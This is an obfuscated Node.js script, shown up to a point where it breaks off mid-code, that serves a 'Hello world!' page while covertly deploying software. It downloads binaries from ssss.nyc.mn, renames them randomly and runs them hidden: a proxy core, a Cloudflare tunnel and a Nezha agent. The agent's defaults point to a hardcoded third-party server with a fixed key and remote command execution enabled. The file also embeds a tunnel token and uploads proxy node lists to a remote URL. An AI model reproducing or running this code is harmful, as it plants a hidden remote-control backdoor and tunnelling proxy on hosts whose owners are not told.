const _0x2dcc3b=_0x16f4;function _0x2739(){const _0x37e3cc=['express','chmod','CFPORT','https://amd64.ssss.nyc.mn/v1','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','fileUrl','quic','Subscription\x20uploaded\x20successfully','direct','none','SUB_PATH','\x20already\x20exists','exec','application/json','/sub.txt\x20saved\x20successfully','match','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pipe','\x20>/dev/null\x202>&1\x20&','stream','existsSync','has','\x0a\x20\x20credentials-file:\x20','102166LgZvDK','push','SERVER_PORT','/vmess-argo?ed=2560','bO4rS1SFumZcuWUfqZNZ9sJ0mdcj4zZR','freedom','false','filter','https+local://8.8.8.8/dns-query','tls','https://oooo.serv00.net/add-url','&path=%2Fvless-argo%3Fed%3D2560#','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Content-Type','clawsg.djw008.dpdns.org','length','nginx.wsdjw.dpdns.org:80','NEZHA_KEY','\x20-c\x20\x22','Error\x20in\x20startserver:','blackhole','1460aNgBXP','message','/api/add-nodes','TunnelSecret','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://amd64.ssss.nyc.mn/agent','status','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','unshift','\x0a\x20\x20tunnel:\x20','eyJhIjoiNzkzMzA2M2M0ZjUwZTk5OWYzODJhNGIzMWFiNTBmMjIiLCJ0IjoiYmM0Y2VjYWEtZjI2Yi00YzFjLTlhMjEtODg0ZjI3OTFiYjY2IiwicyI6IlpUVTFOemcxTnpjdFpEazFZeTAwTVdWaExXSXpOVGN0WkdRNU1URmtPV1ZqTVdWaCJ9','stringify','&fp=firefox&type=ws&host=','sub.txt','8443','NEZHA_PORT','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','countryCode','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','toString','list.txt','map','sub','readFileSync','error','\x0a\x20\x20\x20\x20','2083','\x20-c\x20','country_code','nohup\x20','http','64lGWfIV','PORT','f9b26f58-a4da-4197-bb67-68a3cc2aecd7','npm\x20running\x20error:\x20','127.0.0.1','statSync','forEach','vless','join','automatic\x20access\x20task\x20added\x20successfully','Unknown','https://arm64.ssss.nyc.mn/agent','config.json','6116HoRqpr','ARGO_PORT','xtls-rprx-vision','clear','basename','fileName','App\x20is\x20running','test','random','boot.log','./tmp','tcp','includes','Skipping\x20adding\x20automatic\x20access\x20task','charAt','rm\x20-rf\x20','\x0a\x0avmess://','/vless-argo','utf-8','Nodes\x20uploaded\x20successfully','arm','get','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20is\x20created','http://ip-api.com/json/','mkdirSync','split','ArgoDomain:','from','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','trojan','2053','\x22\x20>\x20/dev/null\x202>&1','\x0aclient_secret:\x20','aarch64','281235fQNlWn','org','createWriteStream','abcdefghijklmnopqrstuvwxyz','Download\x20','https://arm64.ssss.nyc.mn/v1','Unhandled\x20error\x20in\x20startserver:','Error\x20executing\x20command:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','unlinkSync','--tls','UPLOAD_URL','\x0a\x0atrojan://','UUID','data','config.yaml','92183RUlEiT','cdns.doon.eu.org','16020LTskhm','platform','taskkill\x20/f\x20/im\x20','/config.json\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','/trojan-argo','writeFileSync','27645GjfekY','/vmess-argo','/dev/null','tunnel.json','4gDxByo','send','\x20is\x20running','response','win32','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','true','path','/api/delete-nodes','post','text/plain;\x20charset=utf-8','443','child_process','tunnel.yml','log','10294332YAxqDU','base64','catch','/api/add-subscriptions','\x20>\x20nul\x202>&1','PROJECT_URL','&path=%2Ftrojan-argo%3Fed%3D2560#','env','AUTO_ACCESS','php\x20running\x20error:\x20','/tunnel.yml\x20run','finish','https://ipapi.co/json/','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','listen','axios','readdirSync','11HyUGYw','Empowerment\x20success\x20for\x20','2087','Add\x20automatic\x20access\x20task\x20faild:\x20','18ksiYID','https://arm64.ssss.nyc.mn/bot','2096','\x20successfully','clawsg','?encryption=none&security=tls&sni='];_0x2739=function(){return _0x37e3cc;};return _0x2739();}(function(_0x2eb33a,_0x29f610){const _0x322c60={_0x59d1ff:0x179,_0x3a3282:0x19a,_0x3e5007:0x155,_0x217a7b:0x159,_0x44558b:0x17d,_0x50e264:0x14c,_0x1cd2b9:0x10c,_0x22b947:0x119},_0x4c42e5=_0x16f4,_0x587aa6=_0x2eb33a();while(!![]){try{const _0x4130c1=-parseInt(_0x4c42e5(_0x322c60._0x59d1ff))/0x1*(parseInt(_0x4c42e5(_0x322c60._0x3a3282))/0x2)+-parseInt(_0x4c42e5(_0x322c60._0x3e5007))/0x3*(-parseInt(_0x4c42e5(_0x322c60._0x217a7b))/0x4)+-parseInt(_0x4c42e5(0x13c))/0x5*(-parseInt(_0x4c42e5(_0x322c60._0x44558b))/0x6)+parseInt(_0x4c42e5(_0x322c60._0x50e264))/0x7*(-parseInt(_0x4c42e5(_0x322c60._0x1cd2b9))/0x8)+-parseInt(_0x4c42e5(0x14e))/0x9+-parseInt(_0x4c42e5(0x1af))/0xa*(parseInt(_0x4c42e5(_0x322c60._0x22b947))/0xb)+parseInt(_0x4c42e5(0x168))/0xc;if(_0x4130c1===_0x29f610)break;else _0x587aa6['push'](_0x587aa6['shift']());}catch(_0x36ed3e){_0x587aa6['push'](_0x587aa6['shift']());}}}(_0x2739,0x45b9c));const express=require(_0x2dcc3b(0x183)),app=express(),axios=require(_0x2dcc3b(0x177)),os=require('os'),fs=require('fs'),path=require(_0x2dcc3b(0x160)),{promisify}=require('util'),exec=promisify(require(_0x2dcc3b(0x165))[_0x2dcc3b(0x18f)]),{execSync}=require(_0x2dcc3b(0x165)),UPLOAD_URL=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x147)]||'',PROJECT_URL=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x16d)]||'',AUTO_ACCESS=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x170)]||![],FILE_PATH=process[_0x2dcc3b(0x16f)]['FILE_PATH']||_0x2dcc3b(0x123),SUB_PATH=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x18d)]||_0x2dcc3b(0x103),PORT=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x19c)]||process['env'][_0x2dcc3b(0x10d)]||0xbb8,UUID=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x149)]||_0x2dcc3b(0x10e),NEZHA_SERVER=process[_0x2dcc3b(0x16f)]['NEZHA_SERVER']||_0x2dcc3b(0x1aa),NEZHA_PORT=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x1be)]||'',NEZHA_KEY=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x1ab)]||_0x2dcc3b(0x19e),ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x2dcc3b(0x1a8),ARGO_AUTH=process[_0x2dcc3b(0x16f)]['ARGO_AUTH']||_0x2dcc3b(0x1b9),ARGO_PORT=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x11a)]||0x1f41,CFIP=process['env']['CFIP']||_0x2dcc3b(0x14d),CFPORT=process[_0x2dcc3b(0x16f)][_0x2dcc3b(0x185)]||0x1bb,NAME=process['env']['NAME']||_0x2dcc3b(0x181);!fs[_0x2dcc3b(0x197)](FILE_PATH)?(fs[_0x2dcc3b(0x132)](FILE_PATH),console[_0x2dcc3b(0x167)](FILE_PATH+_0x2dcc3b(0x130))):console[_0x2dcc3b(0x167)](FILE_PATH+_0x2dcc3b(0x18e));function generateRandomName(){const _0x308d47={_0x3d9627:0x13f},_0x4357be=_0x2dcc3b,_0x3a0b0c=_0x4357be(_0x308d47._0x3d9627);let _0xcf43a4='';for(let _0x342337=0x0;_0x342337<0x6;_0x342337++){_0xcf43a4+=_0x3a0b0c[_0x4357be(0x127)](Math['floor'](Math[_0x4357be(0x121)]()*_0x3a0b0c[_0x4357be(0x1a9)]));}return _0xcf43a4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2dcc3b(0x114)](FILE_PATH,npmName),phpPath=path[_0x2dcc3b(0x114)](FILE_PATH,phpName),webPath=path[_0x2dcc3b(0x114)](FILE_PATH,webName),botPath=path[_0x2dcc3b(0x114)](FILE_PATH,botName),subPath=path[_0x2dcc3b(0x114)](FILE_PATH,_0x2dcc3b(0x1bc)),listPath=path[_0x2dcc3b(0x114)](FILE_PATH,_0x2dcc3b(0x1c3)),bootLogPath=path[_0x2dcc3b(0x114)](FILE_PATH,_0x2dcc3b(0x122)),configPath=path[_0x2dcc3b(0x114)](FILE_PATH,_0x2dcc3b(0x118));function _0x16f4(_0x35d692,_0x17022d){const _0x27395b=_0x2739();return _0x16f4=function(_0x16f483,_0x4ed410){_0x16f483=_0x16f483-0x103;let _0x55dfbe=_0x27395b[_0x16f483];return _0x55dfbe;},_0x16f4(_0x35d692,_0x17022d);}function deleteNodes(){const _0x190970={_0x258831:0x197,_0x5bdec2:0x104,_0x527e6d:0x12b,_0x168729:0x169,_0x5016c9:0x1c2,_0x1f18e7:0x1a1,_0xfa9af3:0x161},_0x547e80=_0x2dcc3b;try{if(!UPLOAD_URL)return;if(!fs[_0x547e80(_0x190970._0x258831)](subPath))return;let _0x1e5b06;try{_0x1e5b06=fs[_0x547e80(_0x190970._0x5bdec2)](subPath,_0x547e80(_0x190970._0x527e6d));}catch{return null;}const _0xd31392=Buffer[_0x547e80(0x135)](_0x1e5b06,_0x547e80(_0x190970._0x168729))[_0x547e80(_0x190970._0x5016c9)]('utf-8'),_0xbbeaf5=_0xd31392['split']('\x0a')[_0x547e80(_0x190970._0x1f18e7)](_0x37b12a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x547e80(0x120)](_0x37b12a));if(_0xbbeaf5[_0x547e80(0x1a9)]===0x0)return;return axios['post'](UPLOAD_URL+_0x547e80(_0x190970._0xfa9af3),JSON[_0x547e80(0x1ba)]({'nodes':_0xbbeaf5}),{'headers':{'Content-Type':_0x547e80(0x190)}})[_0x547e80(0x16a)](_0x4838a9=>{return null;}),null;}catch(_0x40da4e){return null;}}function cleanupOldFiles(){const _0x289f52=_0x2dcc3b;try{const _0x1a552a=fs[_0x289f52(0x178)](FILE_PATH);_0x1a552a[_0x289f52(0x112)](_0xd6966d=>{const _0x388738=_0x289f52,_0x5b3868=path[_0x388738(0x114)](FILE_PATH,_0xd6966d);try{const _0x2a5f6e=fs[_0x388738(0x111)](_0x5b3868);_0x2a5f6e['isFile']()&&fs[_0x388738(0x145)](_0x5b3868);}catch(_0xaf09ee){}});}catch(_0x1731f5){}}app[_0x2dcc3b(0x12e)]('/',function(_0x239504,_0x45c4af){const _0x3aff5c={_0x372800:0x15a},_0x3774e1=_0x2dcc3b;_0x45c4af[_0x3774e1(_0x3aff5c._0x372800)]('Hello\x20world!');});async function generateConfig(){const _0x165e16={_0x3d3c8c:0x157,_0x3b549c:0x18c,_0x513a78:0x113,_0x14dad1:0x156,_0x2d7787:0x153,_0x592605:0x124,_0x14e5a5:0x124,_0x1a095a:0x113,_0x3a0e34:0x18c,_0x31c64e:0x10b,_0x14c42e:0x1a3,_0xee7231:0x137,_0x5eb4f5:0x1a2,_0x2747c2:0x18b,_0x40840f:0x1ae,_0x41b2b5:0x154,_0x52d121:0x114,_0x262323:0x118},_0x5ba609=_0x2dcc3b,_0x4d05a0={'log':{'access':_0x5ba609(_0x165e16._0x3d3c8c),'error':_0x5ba609(0x157),'loglevel':_0x5ba609(_0x165e16._0x3b549c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5ba609(_0x165e16._0x513a78),'settings':{'clients':[{'id':UUID,'flow':_0x5ba609(0x11b)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x5ba609(_0x165e16._0x14dad1),'dest':0xbbb},{'path':_0x5ba609(_0x165e16._0x2d7787),'dest':0xbbc}]},'streamSettings':{'network':_0x5ba609(_0x165e16._0x592605)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x5ba609(_0x165e16._0x3b549c)},'streamSettings':{'network':_0x5ba609(_0x165e16._0x14e5a5),'security':_0x5ba609(0x18c)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5ba609(_0x165e16._0x1a095a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x5ba609(_0x165e16._0x3a0e34),'wsSettings':{'path':_0x5ba609(0x12a)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5ba609(0x1a3),_0x5ba609(0x189)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5ba609(0x110),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5ba609(0x156)}},'sniffing':{'enabled':!![],'destOverride':[_0x5ba609(_0x165e16._0x31c64e),_0x5ba609(_0x165e16._0x14c42e),_0x5ba609(0x189)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5ba609(0x110),'protocol':_0x5ba609(_0x165e16._0xee7231),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5ba609(0x18c),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5ba609(_0x165e16._0x5eb4f5)]},'outbounds':[{'protocol':_0x5ba609(0x19f),'tag':_0x5ba609(_0x165e16._0x2747c2)},{'protocol':_0x5ba609(_0x165e16._0x40840f),'tag':'block'}]};fs[_0x5ba609(_0x165e16._0x41b2b5)](path[_0x5ba609(_0x165e16._0x52d121)](FILE_PATH,_0x5ba609(_0x165e16._0x262323)),JSON[_0x5ba609(0x1ba)](_0x4d05a0,null,0x2));}function getSystemArchitecture(){const _0x4431ac={_0x151058:0x12d},_0x343642=_0x2dcc3b,_0x3c683e=os['arch']();return _0x3c683e===_0x343642(_0x4431ac._0x151058)||_0x3c683e==='arm64'||_0x3c683e===_0x343642(0x13b)?_0x343642(0x12d):'amd';}function downloadFile(_0x46c8f5,_0x4e28f4,_0x1cff30){const _0x481b04={_0x54f998:0x197,_0x40bffa:0x132,_0x389e9c:0x13e,_0x34889d:0x16a},_0x18c799={_0x30a212:0x152,_0x10b68b:0x105},_0x55bf6d={_0x4c8199:0x194},_0x14ae4b={_0x168e92:0x140,_0x22bf43:0x11d},_0x427704=_0x2dcc3b,_0x52ecf7=_0x46c8f5;!fs[_0x427704(_0x481b04._0x54f998)](FILE_PATH)&&fs[_0x427704(_0x481b04._0x40bffa)](FILE_PATH,{'recursive':!![]});const _0x190859=fs[_0x427704(_0x481b04._0x389e9c)](_0x52ecf7);axios({'method':_0x427704(0x12e),'url':_0x4e28f4,'responseType':_0x427704(0x196)})['then'](_0x3826d7=>{const _0x1a4ac5={_0x3c8932:0x140,_0x55b5db:0x11d,_0x495af1:0x180},_0x4d5939=_0x427704;_0x3826d7[_0x4d5939(0x14a)][_0x4d5939(_0x55bf6d._0x4c8199)](_0x190859),_0x190859['on'](_0x4d5939(0x173),()=>{const _0x5aa1a8=_0x4d5939;_0x190859['close'](),console['log'](_0x5aa1a8(_0x1a4ac5._0x3c8932)+path[_0x5aa1a8(_0x1a4ac5._0x55b5db)](_0x52ecf7)+_0x5aa1a8(_0x1a4ac5._0x495af1)),_0x1cff30(null,_0x52ecf7);}),_0x190859['on']('error',_0x2c5db9=>{const _0x3c6712=_0x4d5939;fs['unlink'](_0x52ecf7,()=>{});const _0xa105dd=_0x3c6712(_0x14ae4b._0x168e92)+path[_0x3c6712(_0x14ae4b._0x22bf43)](_0x52ecf7)+'\x20failed:\x20'+_0x2c5db9['message'];console[_0x3c6712(0x105)](_0xa105dd),_0x1cff30(_0xa105dd);});})[_0x427704(_0x481b04._0x34889d)](_0x3310b9=>{const _0x5b975c=_0x427704,_0x10a773=_0x5b975c(0x140)+path['basename'](_0x52ecf7)+_0x5b975c(_0x18c799._0x30a212)+_0x3310b9['message'];console[_0x5b975c(_0x18c799._0x10b68b)](_0x10a773),_0x1cff30(_0x10a773);});}async function downloadFilesAndRun(){const _0x3884e9={_0x1591c2:0x105,_0x2e1fee:0x125,_0xac05c3:0x164,_0x21d4db:0x1bd,_0x1a1eb5:0x138,_0xa6e1b7:0x15f,_0x511e49:0x1a0,_0x2a32bb:0x1a6,_0x19839f:0x154,_0x17c4ec:0x10a,_0x1143d1:0x1ac,_0x3da000:0x15b,_0x193f08:0x1bd,_0x2439b6:0x17b,_0x383094:0x146,_0x4698fb:0x15b,_0x136754:0x167,_0x3346b6:0x192,_0x5ee6d3:0x136,_0x287308:0x167},_0x4f7372={_0x723b28:0x184},_0x4d4a61=_0x2dcc3b,_0x15a03e=getSystemArchitecture(),_0x5f1491=getFilesForArchitecture(_0x15a03e);if(_0x5f1491['length']===0x0){console[_0x4d4a61(0x167)](_0x4d4a61(0x1b6));return;}const _0xacc284=_0x5f1491[_0x4d4a61(0x1c4)](_0x56f17d=>{const _0x1ab3c6={_0x5b72ac:0x188};return new Promise((_0xcf33ce,_0x504390)=>{const _0x3ed7af=_0x16f4;downloadFile(_0x56f17d[_0x3ed7af(0x11e)],_0x56f17d[_0x3ed7af(_0x1ab3c6._0x5b72ac)],(_0x213f8c,_0x4989ca)=>{_0x213f8c?_0x504390(_0x213f8c):_0xcf33ce(_0x4989ca);});});});try{await Promise['all'](_0xacc284);}catch(_0x2bcb4f){console[_0x4d4a61(_0x3884e9._0x1591c2)]('Error\x20downloading\x20files:',_0x2bcb4f);return;}function _0x24674b(_0x38a6af){const _0x5cbf00={_0x1a0301:0x167,_0x5c28ca:0x17a,_0x301233:0x1c2},_0x55e5da=_0x4d4a61,_0x4c797a=0x1fd;_0x38a6af[_0x55e5da(0x112)](_0x385fb8=>{const _0x528cd7=_0x55e5da;fs[_0x528cd7(0x197)](_0x385fb8)&&fs[_0x528cd7(_0x4f7372._0x723b28)](_0x385fb8,_0x4c797a,_0x23fb96=>{const _0x323c5b=_0x528cd7;_0x23fb96?console[_0x323c5b(0x105)]('Empowerment\x20failed\x20for\x20'+_0x385fb8+':\x20'+_0x23fb96):console[_0x323c5b(_0x5cbf00._0x1a0301)](_0x323c5b(_0x5cbf00._0x5c28ca)+_0x385fb8+':\x20'+_0x4c797a[_0x323c5b(_0x5cbf00._0x301233)](0x8));});});}const _0xf4244=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24674b(_0xf4244);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1b65db=NEZHA_SERVER[_0x4d4a61(_0x3884e9._0x2e1fee)](':')?NEZHA_SERVER[_0x4d4a61(0x133)](':')['pop']():'',_0x31c9a3=new Set([_0x4d4a61(_0x3884e9._0xac05c3),_0x4d4a61(_0x3884e9._0x21d4db),_0x4d4a61(0x17f),_0x4d4a61(0x17b),_0x4d4a61(0x107),_0x4d4a61(_0x3884e9._0x1a1eb5)]),_0x48f6c2=_0x31c9a3[_0x4d4a61(0x198)](_0x1b65db)?_0x4d4a61(_0x3884e9._0xa6e1b7):_0x4d4a61(_0x3884e9._0x511e49),_0x347f87=_0x4d4a61(0x13a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4d4a61(_0x3884e9._0x2a32bb)+_0x48f6c2+_0x4d4a61(0x193)+UUID;fs[_0x4d4a61(_0x3884e9._0x19839f)](path[_0x4d4a61(0x114)](FILE_PATH,_0x4d4a61(0x14b)),_0x347f87);const _0x2fbed0=_0x4d4a61(_0x3884e9._0x17c4ec)+phpPath+_0x4d4a61(_0x3884e9._0x1143d1)+FILE_PATH+_0x4d4a61(0x144);try{await exec(_0x2fbed0),console[_0x4d4a61(0x167)](phpName+_0x4d4a61(_0x3884e9._0x3da000)),await new Promise(_0x58c0b=>setTimeout(_0x58c0b,0x3e8));}catch(_0x1a1bad){console['error'](_0x4d4a61(0x171)+_0x1a1bad);}}else{let _0x5e5197='';const _0x105d4c=['443',_0x4d4a61(_0x3884e9._0x193f08),_0x4d4a61(0x17f),_0x4d4a61(_0x3884e9._0x2439b6),'2083',_0x4d4a61(_0x3884e9._0x1a1eb5)];_0x105d4c[_0x4d4a61(0x125)](NEZHA_PORT)&&(_0x5e5197=_0x4d4a61(_0x3884e9._0x383094));const _0x4bee97=_0x4d4a61(_0x3884e9._0x17c4ec)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5e5197+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4bee97),console[_0x4d4a61(0x167)](npmName+_0x4d4a61(_0x3884e9._0x4698fb)),await new Promise(_0x3be38e=>setTimeout(_0x3be38e,0x3e8));}catch(_0x51f4c2){console[_0x4d4a61(0x105)](_0x4d4a61(0x10f)+_0x51f4c2);}}}else console[_0x4d4a61(_0x3884e9._0x136754)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5b5f29=_0x4d4a61(0x10a)+webPath+_0x4d4a61(0x108)+FILE_PATH+_0x4d4a61(0x151);try{await exec(_0x5b5f29),console[_0x4d4a61(0x167)](webName+_0x4d4a61(0x15b)),await new Promise(_0x418a79=>setTimeout(_0x418a79,0x3e8));}catch(_0x36db5d){console[_0x4d4a61(0x105)]('web\x20running\x20error:\x20'+_0x36db5d);}if(fs[_0x4d4a61(0x197)](botPath)){let _0x505985;if(ARGO_AUTH[_0x4d4a61(0x192)](/^[A-Z0-9a-z=]{120,250}$/))_0x505985='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4d4a61(_0x3884e9._0x3346b6)](/TunnelSecret/)?_0x505985='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4d4a61(0x172):_0x505985='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4d4a61(_0x3884e9._0x5ee6d3)+ARGO_PORT;try{await exec(_0x4d4a61(_0x3884e9._0x17c4ec)+botPath+'\x20'+_0x505985+_0x4d4a61(0x195)),console[_0x4d4a61(_0x3884e9._0x287308)](botName+_0x4d4a61(_0x3884e9._0x4698fb)),await new Promise(_0x5d1d50=>setTimeout(_0x5d1d50,0x7d0));}catch(_0x549bb7){console['error'](_0x4d4a61(0x143)+_0x549bb7);}}await new Promise(_0xa5773e=>setTimeout(_0xa5773e,0x1388));}function getFilesForArchitecture(_0xa2cdcb){const _0x47b199={_0x5f305f:0x1b4,_0xc28788:0x186},_0x13f1e3=_0x2dcc3b;let _0x4dcdd;_0xa2cdcb==='arm'?_0x4dcdd=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x13f1e3(0x17e)}]:_0x4dcdd=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x454ee8=_0xa2cdcb===_0x13f1e3(0x12d)?_0x13f1e3(0x117):_0x13f1e3(_0x47b199._0x5f305f);_0x4dcdd[_0x13f1e3(0x1b7)]({'fileName':npmPath,'fileUrl':_0x454ee8});}else{const _0x49fa68=_0xa2cdcb===_0x13f1e3(0x12d)?_0x13f1e3(0x141):_0x13f1e3(_0x47b199._0xc28788);_0x4dcdd[_0x13f1e3(0x1b7)]({'fileName':phpPath,'fileUrl':_0x49fa68});}}return _0x4dcdd;}function argoType(){const _0x53dab3={_0x3708e2:0x1b3,_0x2bf24f:0x1b2,_0x2b683a:0x154,_0x59db4b:0x114,_0x22eedb:0x158,_0x3e97e3:0x1b8,_0x297ee5:0x133,_0x12ac04:0x199,_0x3f18a9:0x1bf},_0x373262=_0x2dcc3b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x373262(0x167)](_0x373262(_0x53dab3._0x3708e2));return;}if(ARGO_AUTH[_0x373262(0x125)](_0x373262(_0x53dab3._0x2bf24f))){fs[_0x373262(_0x53dab3._0x2b683a)](path[_0x373262(_0x53dab3._0x59db4b)](FILE_PATH,_0x373262(_0x53dab3._0x22eedb)),ARGO_AUTH);const _0x16cd50=_0x373262(_0x53dab3._0x3e97e3)+ARGO_AUTH[_0x373262(_0x53dab3._0x297ee5)]('\x22')[0xb]+_0x373262(_0x53dab3._0x12ac04)+path['join'](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x373262(0x15e)+ARGO_PORT+_0x373262(_0x53dab3._0x3f18a9);fs[_0x373262(0x154)](path['join'](FILE_PATH,_0x373262(0x166)),_0x16cd50);}else console['log'](_0x373262(0x187));}async function extractDomains(){const _0xc4651c={_0xf8ed27:0x167,_0x35e544:0x114,_0x55f53e:0x122,_0x24efca:0x133,_0x5c5428:0x167,_0x2e0286:0x12f,_0x36022d:0x122,_0x3fb722:0x175,_0x2b1b14:0x136,_0x41befb:0x10a,_0x3aabd2:0x15b,_0x154a7f:0x143},_0x4a56c7={_0x545da6:0x14a,_0x899508:0x14a,_0x464a0e:0x12e,_0x5a79bd:0x14a,_0xd5d199:0x1c0,_0x457d18:0x1c0,_0x81ceea:0x13d},_0x56713c={_0xd1060c:0x127,_0x283e35:0x139},_0x4161ce=_0x2dcc3b;let _0x84ff07;if(ARGO_AUTH&&ARGO_DOMAIN)_0x84ff07=ARGO_DOMAIN,console[_0x4161ce(_0xc4651c._0xf8ed27)]('ARGO_DOMAIN:',_0x84ff07),await _0xa31326(_0x84ff07);else try{const _0x555e2c=fs[_0x4161ce(0x104)](path[_0x4161ce(_0xc4651c._0x35e544)](FILE_PATH,_0x4161ce(_0xc4651c._0x55f53e)),_0x4161ce(0x12b)),_0x2c37c5=_0x555e2c[_0x4161ce(_0xc4651c._0x24efca)]('\x0a'),_0x156530=[];_0x2c37c5[_0x4161ce(0x112)](_0x2d7459=>{const _0x570074=_0x4161ce,_0x58218d=_0x2d7459[_0x570074(0x192)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x58218d){const _0x1e7f95=_0x58218d[0x1];_0x156530[_0x570074(0x19b)](_0x1e7f95);}});if(_0x156530[_0x4161ce(0x1a9)]>0x0)_0x84ff07=_0x156530[0x0],console[_0x4161ce(0x167)](_0x4161ce(0x134),_0x84ff07),await _0xa31326(_0x84ff07);else{console[_0x4161ce(_0xc4651c._0x5c5428)](_0x4161ce(_0xc4651c._0x2e0286)),fs[_0x4161ce(0x145)](path['join'](FILE_PATH,_0x4161ce(_0xc4651c._0x36022d)));async function _0x374468(){const _0x4c8348=_0x4161ce;try{process['platform']==='win32'?await exec(_0x4c8348(0x150)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x4c8348(_0x56713c._0xd1060c)](0x0)+']'+botName['substring'](0x1)+_0x4c8348(_0x56713c._0x283e35));}catch(_0x582dd7){}}_0x374468(),await new Promise(_0xe78f5c=>setTimeout(_0xe78f5c,0xbb8));const _0xdc9941=_0x4161ce(_0xc4651c._0x3fb722)+FILE_PATH+_0x4161ce(_0xc4651c._0x2b1b14)+ARGO_PORT;try{await exec(_0x4161ce(_0xc4651c._0x41befb)+botPath+'\x20'+_0xdc9941+_0x4161ce(0x195)),console[_0x4161ce(_0xc4651c._0xf8ed27)](botName+_0x4161ce(_0xc4651c._0x3aabd2)),await new Promise(_0x59b2bb=>setTimeout(_0x59b2bb,0xbb8)),await extractDomains();}catch(_0x94fca6){console[_0x4161ce(0x105)](_0x4161ce(_0xc4651c._0x154a7f)+_0x94fca6);}}}catch(_0x8eeba5){console['error']('Error\x20reading\x20boot.log:',_0x8eeba5);}async function _0x2f00a3(){const _0x209baf=_0x4161ce;try{const _0x1fcccc=await axios['get'](_0x209baf(0x174),{'timeout':0xbb8});if(_0x1fcccc[_0x209baf(_0x4a56c7._0x545da6)]&&_0x1fcccc[_0x209baf(0x14a)][_0x209baf(0x109)]&&_0x1fcccc[_0x209baf(0x14a)][_0x209baf(0x13d)])return _0x1fcccc[_0x209baf(0x14a)][_0x209baf(0x109)]+'_'+_0x1fcccc[_0x209baf(_0x4a56c7._0x899508)][_0x209baf(0x13d)];}catch(_0x2c7926){try{const _0x3ae32f=await 